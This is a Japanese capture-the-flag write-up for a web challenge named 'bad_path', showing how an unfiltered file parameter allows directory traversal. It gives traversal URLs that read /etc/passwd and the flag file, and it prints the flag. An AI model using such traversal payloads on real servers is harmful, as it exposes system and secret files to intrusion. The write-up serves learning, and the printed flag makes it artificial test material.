# bad_path:Web:52pts
Hello Worldを何回もすると成長できるらしいので、そのためにサイトを作りました。  
[https://bad-path.xm4s.net/index.php](https://bad-path.xm4s.net/index.php)  
[Dockerfile](Dockerfile)　　　　[index.php](index.php)  

# Solution
URLにアクセスすると、Hello Worldを表示するコードを表示するサイトのようだ。  
HelloWorld  
[site.png](site/site.png)  
各言語を選択すると、URLのクエリパラメータが以下のように変動する。  
`https://bad-path.xm4s.net/index.php?ext=hello.js`  
`https://bad-path.xm4s.net/index.php?ext=hello.py`  
`https://bad-path.xm4s.net/index.php?ext=hello.rs`  
`https://bad-path.xm4s.net/index.php?ext=hello.c`  
ファイルを読み込んでいるようだ。  
ディレクトリトラバーサルの可能性が高い。  
index.phpより、ブラックリストなどがないことが確認できる。  
`https://bad-path.xm4s.net/index.php?ext=../../../../etc/passwd`にアクセスするとファイルが閲覧できた。  
HelloWorld(/etc/passwd)  
[site_passwd.png](site/site_passwd.png)  
Dockerfileは以下のようになっている。  
```Dockerfile
FROM php:8.0-apache

ADD ./index.php /var/www/html/index.php
ADD ./flag.txt /var/www/flag.txt
ADD ./resource/ /var/www/html/resource/
```
/var/www/flag.txtを表示すれば良いようだ。  
`https://bad-path.xm4s.net/index.php?ext=../../../../var/www/flag.txt`にアクセスする。  
flag  
[flag.png](site/flag.png)  
flagが表示された。  

## xm4s{H3110_H3110_CTF3r}